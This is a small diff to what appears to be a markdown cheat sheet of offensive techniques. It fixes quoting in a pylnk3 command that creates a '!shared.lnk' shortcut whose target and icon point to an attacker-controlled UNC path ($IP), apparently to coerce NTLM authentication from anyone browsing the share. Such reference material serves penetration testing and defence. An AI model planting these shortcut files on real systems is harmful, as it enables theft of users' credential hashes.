@@ -66,7 +66,7 @@ EOF
 ### Via .lnk file
 
 ```sh
-pylnk3 c "\\\\$IP\shared' '!shared.lnk' -i "\\$IP\shared\icon.ico"
+pylnk3 c "\\\\$IP\shared" '!shared.lnk' -i "\\\\$IP\\shared\\icon.ico"
 ```
 
 ### Via .url file
